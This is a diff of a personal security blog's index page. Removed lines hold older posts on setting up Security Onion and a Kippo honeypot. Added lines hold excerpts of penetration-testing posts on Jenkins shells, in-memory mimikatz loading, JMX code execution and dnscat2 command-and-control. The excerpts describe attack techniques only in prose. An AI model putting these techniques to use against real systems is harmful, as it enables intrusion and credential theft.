-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/security-onion-network-configuration-and-install/">
-        Security Onion Network Configuration and Install
-      </a>
-    </h1>
-
-    <span class="post-date">Sat, Oct 19, 2013</span>
-
-    
-<figure >
-    
-        <img src="https://www.thesubtlety.com/img/theonion-wait-what-150x150.jpeg" alt="With apologies to The Onion" />
-    
-    
-    <figcaption>
-        <p>
-        With apologies to The Onion
+    <nav>
+      <ul class="sidebar-nav">
+        <li><a href="https://www.thesubtlety.com/">Home</a> </li>
         
-            
-        
-        </p> 
-    </figcaption>
-    
-</figure>
+      </ul>
+    </nav>
 
+    <p>&copy; 2019. All rights reserved. </p>
+  </div>
+</aside>
 
-<p>I&rsquo;ve played around with <a href="http://securityonion.blogspot.com/">Security Onion</a> in the past, but have never set up my network to capture or monitor traffic. And while installing Security Onion in a VM and only looking at only local or inter-VM traffic is quite interesting, especially if a person is playing around with Metasploit or something, I wanted to see all network traffic, including my other devices. I also had a laptop lying around, not being frequently used; perfect for dedicated monitoring. So I finally got around to working through the details and going through the setup and configuration. This is a little essay on how I did that.</p>
-
-<p>I don&rsquo;t go into much detail in the configuration of Security Onion and subsequent tools, as the <a href="http://code.google.com/p/security-onion/wiki/Installation">Install Wiki</a> and <a href="http://www.irongeek.com/i.php?page=videos/basic-setup-of-security-onion-snort-snorby-barnyard-pulledpork-daemonlogger">Iron Geek&rsquo;s video</a> do a fantastic job of that, but the following is a brief overview of how I set things up. For more background, the Security Onion <a href="http://code.google.com/p/security-onion/w/list">Wiki</a> has a ton of great resources, a few of which I&rsquo;ll refer to in a bit, IronGeek&rsquo;s video walkthrough mentioned above, Doug Burk&rsquo;s <a href="http://www.irongeek.com/i.php?page=videos/derbycon2/2-2-9-doug-burks-security-onion-network-security-monitoring-in-minutes">talk</a> and the very detailed <a href="http://code.google.com/p/security-onion/wiki/IntroductionWalkthrough">walkthrough</a> on the Security Onion Wiki give tons of detailed info on setup and configuration.</p>
-
-<p>Useful things before starting, depending on use case:</p>
-
-<ul>
-<li><p>Dedicated machine(s) for Security Onion</p></li>
-
-<li><p>Router/gateway supporting iptables</p></li>
-
-<li><p>VirtualBox or VMware</p></li>
-</ul>
-
-<p><strong>First things first, a little research</strong></p>
-
-<p>I was somewhat at a loss on how to configure the actual network and mirror/span traffic to my laptop and Security Onion with only a simple Router. I&rsquo;m running DD-WRT, but the router itself has no physical span ports. The Security Onion Wiki has a <a href="http://code.google.com/p/security-onion/wiki/Hardware">Hardware page</a> which has a few links to cheap taps, but I didn&rsquo;t necessarily want to go that route for a simple operation like this. After watching Iron Geek&rsquo;s video, I was surprised I hadn&rsquo;t realized the solution earlier. iptables can copy all traffic (via -tee). And if you have iptables on the router, voila.</p>
-
-<p>I wanted something like this. Actually, this is a dumb diagram, mostly I just wanted to use <a href="http://www.asciiflow.com">asciiflow.com</a></p>
-
-<pre><code>                             +-------------+
-                             | Ze Internet |
-                             +------+------+
-                                    |
-                              +-----v-----+       +------------+
-                              |  Router   |       | Security   |
-                              |           +------&gt;| Onion      |
-                              +-----+-----+       +------------+
-                                    ^     xx
-                    +---------------+------+x
-                    |               |       xx
-            +-----+------+   +------+---+    xx
-            |  Desktop   |   | Laptop   |  Tablet, Phone, etc
-            +------------+   +----------+
-</code></pre>
-
-<p><strong>Let&rsquo;s Get Going Already!</strong></p>
-
-<p>Still doing some prep work, I had to get Security Onion installed on my laptop and since I didn&rsquo;t want to lose my existing setup I chose to install in a VM. But before actually starting this goodness that is Security Onion, there is some configuration to do. We need lots of disk space, and a good amount of ram. We also need to configure our network adapter settings. As you will see while reading the Installation directions, Security Onion needs two NICs: one for monitoring, and one for management (wireless in my case). In the VM settings, I set Adapter 1 to bridge with my wired connection, and used Promiscuous Mode: All. I set Adapter 2 to bridge with my wireless connection and Promiscuous Mode: Deny. You can read a lot more info on that and VM networking settings <a href="http://www.virtualbox.org/manual/ch06.html#network_bridged.">here.</a> I&rsquo;m certain there are more ways to configure this, but this works.</p>
-
-<p>Once your VM settings are good, you&rsquo;re left with actually installation and configuration. Installation itself is not too difficult if you can read directions. Lengthy and very detailed installation doc on the Security Onion <a href="http://code.google.com/p/security-onion/wiki/Installation">Install Wiki </a>as well as the <a href="http://code.google.com/p/security-onion/wiki/IntroductionWalkthrough">walkthrough</a>. Further configuration of tools and alerts takes more time, and some of that is nicely covered in Iron Geek&rsquo;s video.</p>
-
-<p>Now that we have Security Onion set up and configured, lets point all the traffic towards it. As mentioned before, I&rsquo;m going to do that with iptables as referenced <a href="http://www.myopenrouter.com/article/10917/Port-Mirroring-Span-Port-Monitor-Port-with-iptables-on-NETGEAR-WGR614L/">here</a>. In DD-WRT, this can be done via ssh or Admin &gt; Commands and entering:</p>
-
-<pre><code>iptables -A PREROUTING -t mangle -j ROUTE --gw &lt;IP of Sec Onion box&gt; --tee    
-iptables -A POSTROUTING -t mangle -j ROUTE --gw &lt;IP of Sec Onion box&gt; --tee
-
-Note: I'm actually using the host's bridged wired interface here as Security 
-      Onion's monitoring interface is not assigned an IP address.
-</code></pre>
-
-<p>Save Firewall and test things out!</p>
-
-<p><strong>Causing High Severity Incidents</strong></p>
-
-<p>A simple ping from one of your devices to the router should show up, or a more sure-fire way to see an event is to go to, or <em>curl</em> <em>http:/testmyids.com,</em> which simply returns _uid=0(root) gid=0(root) groups=0(root). _In Snorby you should see a Sev 2 &ldquo;GPL ATTACK_RESPONSE id check returned root&rdquo; event, from which you can dig into further and see Payload, the Snort rule, and so on.</p>
-
-<p>If so, things are good! If not, there are lots of great resources out there, not least the <a href="http://code.google.com/p/security-onion/w/list.">Wiki pages  </a>I&rsquo;m off to test things out; Security Onion has a ton of tools to get to know. Good luck!</p>
-
+    <main class="content container">
+    <div class="posts">
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/patching-boto3-useragent/">Monkeying Around: Patching the boto3 User-Agent</a>
+  </h1>
+  <time datetime="2019-02-16T16:32:17-0800" class="post-date">Sat, Feb 16, 2019</time>
+  I was recently doing some testing in AWS with some &ldquo;obtained&rdquo; access keys. Part of this engagement was to identify some threshold at which the blue team was noticing and engaging with suspicious activity and as such we were running some automated tooling. In AWS this can mean bruteforcing services and creating quite a bit of logs.
+After not so long we got a request asking if we were up to anything - success!
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/patching-boto3-useragent/">Read More…</a>
   </div>
   
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/kippo-on-the-raspberry-pi/">
-        Kippo on the Raspberry Pi
-      </a>
-    </h1>
-
-    <span class="post-date">Tue, May 7, 2013</span>
-
-    <p>I recently bought a Raspberry Pi and installed <a href="http://archlinuxarm.org/platforms/armv6/raspberry-pi#qt-platform_tabs-ui-tabs2">Arch Linux ARM</a> on it. I came across a rather amusing blog post of someone using the <a href="https://en.wikipedia.org/wiki/Honeypot_(computing)">honeypot</a> <a href="https://code.google.com/p/kippo/">Kippo</a> and thought what fun. See <a href="http://www.iwatchedyourhack.org/">here</a> to watch elite hackers and their mad skillz. That&rsquo;s the great thing about Kippo - it records user sessions for playback.</p>
-
-<p>Anyways, this post basically walks through what I did to get Kippo and <a href="http://bruteforce.gr/kippo-graph">kippo-graph</a> up and running on my RPi. This isn&rsquo;t a walk-you-through-every-step guide, so if you&rsquo;re following along your mileage may vary. Of course, the <a href="https://code.google.com/p/kippo/w/list">Wiki pages</a> over on Google Code are a good place to start. Or <a href="http://bruteforce.gr/installing-kippo-ssh-honeypot-on-ubuntu.html">here</a>. Or <a href="http://www.ctrl-alt-del.cc/2010/07/making-new-friends-with-kippo.html">here</a>. Everyone&rsquo;s done this! But without further adieu&hellip;</p>
-
-<p>Install all the dependencies. You need svn to pull the source which is easy enough, and Kippo has several dependencies as well. These would Python 2.5+, Twisted 8+, PyCrypto, and Zope-interface. Don&rsquo;t do like I did and install the default Python 3+. Apparently there was a change to the print statement (become a function) and I was getting syntax errors. Downgraded and all was peachy. Rename the kippo.cfg.dist file to kippo.cfg and make changes as you please.</p>
-
-<p>Kippo runs on port 2222 by default and you can probably leave this as is. There are a <a href="https://code.google.com/p/kippo/wiki/MakingKippoReachable">couple</a> methods to get Kippo running on port 22, and I chose to use iptables. I&rsquo;ll come back to that. I also wanted to be able to access my RPi using SSH, and if we have iptables pointing port 22 to Kippo, well that&rsquo;s no good. Let&rsquo;s <code>sudo vi /etc/ssh/sshd_config</code> and change the default port to something else, like 2220 or something and restart sshd.</p>
-
-<p>Next, we want packets destined for port 22 to be redirected to Kippo. This can be accomplished using the iptables command</p>
-
-<pre><code>~#iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
-</code></pre>
-
-<p>And saving with <code>iptables-save &gt; /etc/iptables/iptables.rules</code>. You may need to <code>sudo -i</code> first as piping to output runs as the current user. Kippo isn&rsquo;t running as root is it? No, of course not, you wouldn&rsquo;t do that.</p>
-
-<p>Cool. Now start Kippo. Running netstat on the RPi should show Kippo (seen below as python2) listening on 2222 and SSH listening on 2220.</p>
-
-<pre><code>[pi@myRPi kippo]$ sudo netstat -antp
-Active Internet connections (servers and established)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-tcp        0      0 0.0.0.0:2220           0.0.0.0:*               LISTEN      113/sshd            
-tcp        0      0 0.0.0.0:2222           0.0.0.0:*               LISTEN      266/python2                          
-tcp        0      0 192.168.1.229:2222     192.168.10.199:42451    ESTABLISHED 208/sshd: pi [priv]
-</code></pre>
-
-<p>And running nmap on my RPi from my desktop shows that port 22 is also listening, so we know iptables is properly accepting and forwarding packets. Note the ssh-hostkey is the same for both ports 22 and 2222.</p>
-
-<pre><code>np@whereami [03:26:17] [~] 
--&gt; % sudo nmap -A -sS myRPi -p 1-2222
-Starting Nmap 6.25 ( http://nmap.org ) at 2013-05-04 15:26 EDT
-Nmap scan report for myRPi (192.168.10.229)
-Host is up (0.00045s latency).
-Not shown: 22220 closed ports
-PORT      STATE SERVICE VERSION
-22/tcp    open  ssh     OpenSSH 5.1p1 Debian 5 (protocol 2.0)
-|_ssh-hostkey: 1024 50:d3:4e:ac:6d:2e:94:66:ac:02:ce:9b:f9:b7:cd:69 (RSA)
-2222/tcp open  ssh     OpenSSH 5.1p1 Debian 5 (protocol 2.0)
-|_ssh-hostkey: 1024 50:d3:4e:ac:6d:2e:94:66:ac:02:ce:9b:f9:b7:cd:69 (RSA)
-2220/tcp open  ssh     OpenSSH 6.2 (protocol 2.0)
-| ssh-hostkey: 1024 e3:9c:96:42:e6:4c:f0:53:d4:44:31:cd:f3:e5:35:89 (DSA)
-| 2048 85:38:a1:25:da:9f:8d:d7:24:f7:ed:37:ae:76:e3:43 (RSA)
-|_256 39:34:f2:83:ac:a4:43:ff:d0:4b:9d:3b:ac:d0:bf:48 (ECDSA)
-MAC Address: B8:27:EB:33:BE:85 (Raspberry Pi Foundation)
-</code></pre>
-
-<p>You can test logging into both regular SSH via <code>ssh -p 2220 user@RPi</code> or to Kippo using <code>ssh root@RPi</code> which will default to port 22.</p>
-
-<p>Not quite finished, though. We need to make port 22 available to the world, and this can be accomplished by port forwarding at the router. My RPi has a static IP address, so logging into my router, I simply forwarded port 22 to my RPi&rsquo;s port 22. If you want to check and see if this is working, something like <a href="http://www.yougetsignal.com/tools/open-ports/">You Get Signal</a> can tell you if it&rsquo;s open or not.</p>
-
-<p>Kippo&rsquo;s logs can be viewed in the installation folders /log/kippo.log. This is raw output, though and I wanted something prettier. As I alluded to earlier, I used <a href="http://bruteforce.gr/kippo-graph">Kippo-graph</a>. Kippo-graph requires running an apache server, MariaDB (MySQL drop-in), and PHP, so those will need installed as well. I used the mysql_secure_installation and <a href="http://bruteforce.gr/logging-kippo-events-using-mysql-db.html">this guide</a> for basic configuration of the database and Kippo&rsquo;s configuration. And this <a href="https://wiki.archlinux.org/index.php/LAMP">fantastic Arch guide</a> to get Apache and PHP configured. Pay attention to the PHP config file and ensure the correct modules are enabled. I missed un-commenting and was getting a blank screen when I tried to generate graphs. Also note that graphs will appear broken until the database has something captured.</p>
-
-<p>Once everything is configured, restart the httpd service and browse to wherever you&rsquo;ve hosted those files, e.g. <code>http://myRPi:80</code> and peruse away. Of course there won&rsquo;t be much to peruse initially, but all in good time my friend. </p>
-
-<p>Now to let this thing run for a bit and see what it catches!</p>
-
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/2017-06-21-decrypting-jenkins2-credentials/">Decrypting Jenkins 2 Credentials</a>
+  </h1>
+  <time datetime="2017-06-21T23:07:11-0700" class="post-date">Wed, Jun 21, 2017</time>
+  I like Jenkins. It&rsquo;s a good orchestration tool and provides remote code execution as a service.
+If your user permissions give you access to the script console /script it&rsquo;s trivial to obtain a shell. The developers explicitly call this out in their documentation as well so it&rsquo;s a feature, not a bug. Of course if you can create a job you can run shell commands as well, but I&rsquo;ll leave that for another time.
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/2017-06-21-decrypting-jenkins2-credentials/">Read More…</a>
   </div>
   
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/career-readme-txt/">
-        Career README.txt
-      </a>
-    </h1>
-
-    <span class="post-date">Thu, Apr 4, 2013</span>
-
-    <p>I read this <a href="http://www.kalzumeus.com/2011/10/28/dont-call-yourself-a-programmer">article</a> by Patrick McKenzie a while back, came across it again, and decided it&rsquo;s worth reading weekly. I&rsquo;ve pulled out some of his bolded points. But seriously, read the article in it&rsquo;s entirety. Again. And again.</p>
-
-<p><strong>Don&rsquo;t Call Yourself a Programmer, And Other Career Advice</strong></p>
-
-<ul>
-<li><p>Modesty is not a career enhancing character trait</p></li>
-
-<li><p>Network. In person.</p></li>
-
-<li><p>Learn how to negotiate</p></li>
-
-<li><p>Get good at Enterprise Sales</p></li>
-
-<li><p>Most jobs are never available publicly</p></li>
-
-<li><p>You really want to be attached to Profit Centers</p></li>
-
-<li><p>Describe yourself by what you have accomplished for previous employers vis-a-vis increasing revenues or reducing costs</p></li>
-
-<li><p>You radically overestimate the average skill of the competition because of the crowd you hang around with</p></li>
-
-<li><p>I like this one: Business decisions are made by relatives of chimps, not by rules or algorithms</p></li>
-
-<li><p>Your most important skill is communication. Give the perception that you create value</p></li>
-
-<li><p>People who are skilled in negotiation make more than those who are not</p></li>
-
-<li><p>Engineers are hired to create business value, not to program things</p></li>
-
-<li><p>Happiness will not be dominated by your career. Work to live.</p></li>
-</ul>
-
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/2017-04-19-using-katz-to-reflectively-load-exe/">Using subTee&#39;s katz to Reflectively Load an exe</a>
+  </h1>
+  <time datetime="2017-04-19T18:19:01-0700" class="post-date">Wed, Apr 19, 2017</time>
+  I haven&rsquo;t seen this specifically outlined anywhere so I figured I&rsquo;d write a short post to go over using subTee&rsquo;s Katz2.0 program to create a custom binary that loads mimikatz (or whatever executable you&rsquo;d like) into memory. Casey Smith (subTee) and company have created some incredible tools that have made my life easier, so hats off to them.
+Reflective Injection The following steps will create a custom binary with an encrypted and encoded mimikatz binary string which will load mimikatz into memory through reflective PE injection.
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/2017-04-19-using-katz-to-reflectively-load-exe/">Read More…</a>
   </div>
   
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/rob-fuller-on-getting-a-job-in-infosec/">
-        Rob Fuller on Getting a Job in InfoSec
-      </a>
-    </h1>
-
-    <span class="post-date">Fri, Feb 22, 2013</span>
-
-    <p>I was fortunate enough to get a good job in IT right out of college. Not in InfoSec, but in telecom, and in specific, service delivery. I&rsquo;m learning an incredible amount - from enterprise telephony environment to working in a highly complex work environment to leading delivery on new intent projects. But it&rsquo;s not InfoSec.</p>
-
-<p>In my search for ways to break into InfoSec, I&rsquo;ve come across numerous <a href="https://www.schneier.com/blog/archives/2012/07/how_to_become_a_1.html">posts</a>, <a href="http://pauldotcom.com/2009/05/getting-started-in-information.html">advice</a>, and <a href="https://krebsonsecurity.com/category/how-to-break-into-security/">tips</a> to do just that. And this is great stuff - I&rsquo;m working on the learning and the doing covered in those posts. But I really enjoyed the clear, common sense advice on building a  resume, the job search, interview techniques, brand building, and general career advice given by Rob Fuller. Watch the presentation <a href="http://vimeo.com/4108726">here</a>. (About 50 minutes)</p>
-
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/2017-03-13-informacast-singlewire-insecure-jmx/">Informacast Singlewire Insecure JMX Config to RCE</a>
+  </h1>
+  <time datetime="2017-03-13T23:17:52-0700" class="post-date">Mon, Mar 13, 2017</time>
+  I recently came across a good reminder to double check listening ephemeral ports. The organization in question was using the Informacast Singlewire Desktop Notifier v2.0 application. It allows organizations &ldquo;to display a pop-up window on top of other running applications to inform users of important information&rdquo; or to send desktop alerts to users in geographic regions.
+After some enumeration, it looked like it was exposing a JMX Remote management port of we&rsquo;ll say port 42424.
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/2017-03-13-informacast-singlewire-insecure-jmx/">Read More…</a>
   </div>
   
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/on-the-dumbest-ideas-in-computer-security/">
-        On the Dumbest Ideas in Computer Security
-      </a>
-    </h1>
-
-    <span class="post-date">Sat, Sep 15, 2012</span>
-
-    <p>The other day I came across an article by <a href="http://en.wikipedia.org/wiki/Marcus_J._Ranum">Marcus J Ranum</a> on <a href="http://www.ranum.com/security/computer_security/editorials/dumb/index.html">the six dumbest ideas in computer security</a> which were very simple yet struck me as profound. I&rsquo;ll summarize them here for future reference.</p>
-
-<p>1) Default Permit</p>
-
-<p>Back when computer networks were still in their infancy, there were few avenues for attack. With those avenues turned off, all else was allowed. Hence &ldquo;default permit.&rdquo; Another area is code execution: anything clicked is permitted to run, unless stopped by antivirus or the likes. The proper solution here is default deny, but this, according to Ranum, takes dedication, thought, and understanding, and so is seldom done. And it allows one to sleep better at night.</p>
-
-<p>2) Enumerating Badness</p>
-
-<p>This is a subset of Default Permit, but is interesting as well. As mentioned previously, there were only a few avenues for attack, so if you blocked those vectors, you should be good, right? No, this is &ldquo;enumerating badness.&rdquo; This is a dumb idea because of the incredible amount of badness that exists. Antivirus tries to track the thousands and thousands of viruses, etc and stop them, rather than a solution that tracks the (very few) legitimate applications that regularly run and deny all else. Why is this not a consumer solution in today&rsquo;s world?</p>
-
-<p>Another great concept is that of <a href="http://www.ranum.com/security/computer_security/papers/ai/index.html">&ldquo;Artificial Ignorance&rdquo;</a>, where you get rid of uninteresting log entries, and keep all else, which, if they are not uninteresting, must be interesting.</p>
-
-<p>3) Penetrate and Patch</p>
-
-<p>In regards to one&rsquo;s online resource, you attack it as an attacker would, find a flaw, fix it, and continue searching. There is a brilliant term for this as Ranum says: &ldquo;turd polishing.&rdquo; This process does nothing to make your code better in the long run, but management likes the improved, shiny appearance in the short term. It does not improve the design, rather &ldquo;toughens by trial and error.&rdquo; This seems obvious when one thinks about it, but it is so prevalent that one hardly realizes how dumb it is. Vulnerability researchers publish holes, and holes are patched.</p>
-
-<p>But if vendors wrote code &ldquo;designed to be secure and reliable, then vulnerability discovery would be tedious.&rdquo; Think Internet Explorer: vulnerabilities have been found for over ten years. Ranum says pen-testing is pointless and pointless is dumb, because one will either find numerous bugs, or nothing comprehensible. Secure by design!</p>
-
-<p>4) Hacking is Cool</p>
-
-<p>Ranum say here that &ldquo;hacking is a social problem.&rdquo; With internet anonymity, timid people can become criminals, and media portrays them as &ldquo;whiz kids&rdquo;. Ultimately, teaching oneself exploits means investing time learning tools and techniques that become useless when everyone has patched that particular hole. Ones professional skill-set &ldquo;becomes dependent on penetrate and patch&rdquo; and you have arms race again.</p>
-
-<p>While I see what Ranum is saying here, I believe knowing how these exploits work, and how holes are exploited is still useful to know. I do entirely agree with this statement, though: &ldquo;it would be more sensible to design security systems that are hack-proof than to learn how to identify security systems that are dumb.&rdquo;</p>
-
-<p>5) Educating Users</p>
-
-<p>This is interesting as well, because it, too, seems so prevalent and accepted today. Education is good, right? If &ldquo;educating users was going to work, it would have worked by now.&rdquo; People are easily socially engineered. Ranum likens it to penetrate and patch, and having to &ldquo;patch&rdquo; users every week. He asks &ldquo;why do we need to educate users at all?&rdquo; This is like Default Permit again - &ldquo;Why are users getting executable attachments at all?&rdquo; The root issue is not dumb users, but rather the security architecture that is broken.</p>
-
-<p>6) Action is Better than Inaction</p>
-
-<p>Here we have &ldquo;early adopters&rdquo; and &ldquo;pause and thinkers.&rdquo; Ranum says &ldquo;pause and thinkers&rdquo; build more successful, secure, mission-critical systems. He illustrates this with &ldquo;one senior IT executive&rsquo;s roll out plan for a wireless corporate network was &lsquo;wait two years and hire the guy who did a successful wireless deployment for a company larger than us.&rsquo; The technology will be more mature and cheaper by then.&rdquo;</p>
-
-<p>So: to myself or another reader who has stumbled along this far, I highly recommend (re)reading Ranums entire article. And maybe check out his website, which is full of interesting links. I think a takeaway here is to identify the root cause and fix that, rather than continue turd polishing everything in sight; that is surely a losing battle.</p>
-
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/2017-02-11-osce-review/">The OSCE | Cracking the Perimeter Review</a>
+  </h1>
+  <time datetime="2017-02-11T13:05:48-0800" class="post-date">Sat, Feb 11, 2017</time>
+  I recently took the CTP course by Offensive Security and passed the OSCE exam. Now there are a few dozen reviews on this thing, but I&rsquo;ll add my own take here anyway.
+Pre Course You can&rsquo;t just register for the CTP - you need to solve a small challenge first: http://fc4.me/. When I initially thought about taking this course, part of this challenge was beyond me. But to quote g0tmi1k:
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/2017-02-11-osce-review/">Read More…</a>
   </div>
   
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/breaking-into-security/">
-        Breaking into Security
-      </a>
-    </h1>
-
-    <span class="post-date">Mon, Jun 25, 2012</span>
-
-    <p>This blogging thing is harder than it seems - the what to write, the time to write. I came across another interesting blog post from <a href="http://m.krebsonsecurity.com/2012/06/how-to-break-into-security-ptacek-edition/">Krebs on Security</a>,  who interviewed Thomas Ptackek, founder of Matasano Security, on how to get into the field of computer security. As this is precisely my intent, I gave it a quick read through and thought to post a to-do for myself.</p>
-
-<ol>
-<li><p>Learn how to program. Plugging away with Ruby. Get dabbling in Python and C.</p></li>
-
-<li><p>Set up a home lab for experimenting<em>. Done.</em></p></li>
-
-<li><p>Install an old version of Wordpress on a VM.</p></li>
-
-<li><p>Use WebScarab or Burp Suite on your ancient Wordpress site.</p></li>
-
-<li><p>The best jobs in the field are in application security.</p></li>
-
-<li><p>Position yourself near custom software development or get a role in QA.</p></li>
-
-<li><p>Find opportunities to practice in your job.</p></li>
-</ol>
-
-<p>This is exciting and encouraging! And because I&rsquo;m already started on a couple of these things, I&rsquo;m well on my way. Thanks Brian Krebs and Thomas Ptacek!</p>
-
-<p>By the way, the <a href="http://www.matasano.com/careers/">careers page</a> of Matasano security is awesome as far as what to expect when interviewing for a pen testing job.</p>
-
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/2017-01-25-query-shodan-and-censys-with-shocens/">Search Shodan and Censys With Shocens</a>
+  </h1>
+  <time datetime="2017-01-25T21:06:57-0800" class="post-date">Wed, Jan 25, 2017</time>
+  Recon is close to step one in any pentest. When it comes to passively pulling data on infrastructure assets you have a number of options. ARIN can help identify an organization&rsquo;s registered net blocks, but that&rsquo;s only part of the picture. With many organizations based in or using cloud services, those assets won&rsquo;t necessarily be registered to your target.
+And when AWS for example can tie directly into a datacenter, these servers become quite valuable.
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/2017-01-25-query-shodan-and-censys-with-shocens/">Read More…</a>
   </div>
   
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/random-ramblings/">
-        My Random Ramblings
-      </a>
-    </h1>
-
-    <span class="post-date">Wed, Jan 4, 2012</span>
-
-    <p>Here, shall I attempt to document some random doings related to computers, security, linuxstuff, windowsstuff, and most likely miscellany.</p>
-
-<p>Apparently typing all this out helps the mind become better at communicating, and who doesn&rsquo;t want that?</p>
-
-<p>So whether you or another read these ramblings, or I myself re-read them later on in my ever so awe-inspiring, galvanic, exhilarating life, let this be a place for learning and perusing.</p>
-
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/persistent-dnscat2/">Persistent C2 with dnscat2</a>
+  </h1>
+  <time datetime="2016-12-19T17:19:40-0800" class="post-date">Mon, Dec 19, 2016</time>
+  Occasionally an environment has strict outbound rules with all traffic going through an authenticated proxy. This hampers exfiltration, especially if you don&rsquo;t currently have valid credentials but need a foothold into an environment without phishing for instance. If we can find a live network jack in some accessible place and the switch hands out an IP address via DHCP along with DNS servers, we can more than likely obtain a foothold into the network.
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/persistent-dnscat2/">Read More…</a>
   </div>
   
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/about/">
-        About
-      </a>
-    </h1>
-
-    <span class="post-date">Sun, Jan 1, 2012</span>
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/opendnss-appsec-training-lab/">OpenDNS&#39;s AppSec Training Lab</a>
+  </h1>
+  <time datetime="2015-08-23T00:27:58Z" class="post-date">Sun, Aug 23, 2015</time>
+  I came across OpenDNS Security Ninjas AppSec Training Lab not too long ago and found its simplicity rather enjoyable. It&rsquo;s a simple web app written in PHP which illustrates each of the OWASP Top 10 categories. As I was going through the exercises I found myself checking to see how the vulnerable code was written and how the issues could be remediated.
+Since the lab is geared towards beginners, I thought it might be helpful to provide brief explanations along with links to the relevant lines of source code.
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/opendnss-appsec-training-lab/">Read More…</a>
+  </div>
+  
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/the-oscp-penetration-testing-with-kali-linux/">The OSCP | Penetration Testing With Kali Linux</a>
+  </h1>
+  <time datetime="2014-12-20T22:03:29Z" class="post-date">Sat, Dec 20, 2014</time>
+  I&rsquo;ve spent the last few months working through the Penetration Testing with Kali Linux course by Offensive Security which has been an awesome learning experience.
+Much has been said on this course and I&rsquo;ll only briefly go over my experience and takeaways. The following reviews were helpful in making the decision to take the course.
+ Review by g0tmi1k Review by recrudesce Review from Buffered.io Review from IODigitalSec Review from SecuritySift   For a little preview of what&rsquo;s involved, check out the free Metasploit Unleashed course.
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/the-oscp-penetration-testing-with-kali-linux/">Read More…</a>
+  </div>
+  
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/building-a-web-app-in-rails/">Building a Web App in Rails</a>
+  </h1>
+  <time datetime="2014-04-11T01:57:03Z" class="post-date">Fri, Apr 11, 2014</time>
+  A brilliant software engineering friend and I were recently discussing with another mutual friend the inefficiencies of employees filling out paper forms after completion of a construction job and the inefficiencies of transferring said forms to excel and so on. Said friend and I figured we could probably fix this with a web app for a nominal fee, but which would greatly increase our mutual friends&rsquo; productivity. A win win situation if there ever was one.
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/building-a-web-app-in-rails/">Read More…</a>
+  </div>
+  
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/renewing-your-startcom-ssl-cert/">Renewing your StartCom SSL Cert</a>
+  </h1>
+  <time datetime="2014-03-15T00:57:49Z" class="post-date">Sat, Mar 15, 2014</time>
+  Since I&rsquo;ve forgotten how to do this over the past year, here are the directions for posterity.
+ Startcom sends you a reminder after 50 weeks and opens a window for a renewal. Log in and validate your email and domain using the Validation Wizard. Note, you need to ensure your email is going to forward properly.
+ Generate a key and CSR on the server with the following two commands openssl genrsa -out .
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/renewing-your-startcom-ssl-cert/">Read More…</a>
+  </div>
+  
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/just-the-basics/">Just the Basics</a>
+  </h1>
+  <time datetime="2014-02-17T20:58:31Z" class="post-date">Mon, Feb 17, 2014</time>
+  Things have been busy lately, but I&rsquo;ve been doing some reading, learning, and playing around in a small VM lab, and thought to briefly document what I&rsquo;ve done. There is unfortunately nothing groundbreaking here, and nothing too interesting beyond a demonstration.
+___ ___ _ _ _ _ | \/ | | | | | (_)| | | . . | ___ | |_ __ _ ___ _ __ | | ___ _ | |_ | |\/| | / _ \| __|/ _` |/ __|| '_ \ | | / _ \ | || __| | | | || __/| |_| (_| |\__ \| |_) || || (_) || || |_ \_| |_/ \___| \__|\__,_||___/| .
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/just-the-basics/">Read More…</a>
+  </div>
+  
+</article><article class="post">
+  <h1 class="post-title">
+    <a href="https://www.thesubtlety.com/post/bsidesdc-badge/">BSidesDC Badge </a>
+  </h1>
+  <time datetime="2013-10-29T01:19:19Z" class="post-date">Tue, Oct 29, 2013</time>
+  I recently attended my first security conference: BSidesDC. This isn&rsquo;t a write up of that experience, although it was quite interesting and I learned a lot via some great sessions. One talk I really enjoyed by @grecs was Malware Analysis 101. Very well presented with lots of great getting started material.
+  Anyways, the badges. Pretty cool badges; bottle openers in fact, with fourteen binary bytes all with leading zeroes around the circumference: ascii encoded binary.
+  
+  <div class="read-more-link">
+    <a href="https://www.thesubtlety.com/post/bsidesdc-badge/">Read More…</a>
+  </div>
+  
